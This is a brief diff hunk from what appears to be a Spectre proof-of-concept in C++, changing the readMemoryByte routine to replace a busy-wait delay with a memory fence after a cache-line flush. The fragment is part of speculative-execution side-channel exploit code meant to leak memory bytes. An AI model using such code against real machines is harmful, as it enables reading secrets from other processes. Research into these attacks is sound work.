@@ -142,7 +142,8 @@ void crySpectre::readMemoryByte(size_t addr, uint8_t val[2], int32_t score[2])
         for(j = 29; j >= 0; --j)
         {
             _mm_clflush(&interimSize);
-            for(volatile int z = 0; z < 100; ++z) {}
+            _mm_mfence();
+            //for(volatile int z = 0; z < 100; ++z) {}
             
             x = ((j % 6) - 1) & ~0xFFFF;
             x = (x | (x >> 16));
